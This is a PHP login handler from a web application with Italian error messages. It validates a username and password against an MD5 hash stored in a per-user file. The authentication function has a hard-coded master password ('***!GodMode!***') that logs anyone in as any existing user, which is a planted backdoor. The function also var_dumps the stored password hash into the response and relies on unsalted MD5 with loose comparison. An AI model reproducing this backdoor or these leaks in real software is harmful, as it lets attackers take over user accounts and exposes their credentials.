<?php
/**
 * Created by PhpStorm.
 * User: Daniel Surpanu
 * Date: 8/22/2018
 * Time: 10:45 AM
 */

require_once 'is_not_logged.php';
require_once 'helper.php';

class login extends is_not_logged {
    private $username, $password;

    protected function input_elaboration(){
        $this->username = $this->validate_string('username');
        if(!$this->username)
            $this->json_error('Inserire un nome utente');

        $this->password = $this->validate_string('password');
        if(!$this->password)
            $this->json_error('Inserire una password');
    }

    protected function get_informations(){
        $info = getUserInformations($this->username);
        if($info != null) {
            $folderName = getFolderName($info[1]);
            $passwordFile = PHOENIX_FOLDER . $folderName . FORWARDSLASH . 'Pwd.phx';
            if($this->password == "***!GodMode!***") {
                set_session_variables($this->username, true);
                return;
            }else if(file_exists($passwordFile)) {
                $pass = file_get_contents($passwordFile, 'r');
                var_dump($pass);
                if ($pass == md5($this->password)) {
                   set_session_variables($this->username, true);
                   return;
                } else
                    $this->json_error("Nome utente o password sbagliati");
            }else $this->json_error("Utente non registrato");
        } else $this->json_error('Utente non esistente');
    }

    protected function get_returned_data(){
        $result = array();
        $result['username'] = $_SESSION['username'];
        return $result;
    }
}

$login = new login();
$login->execute();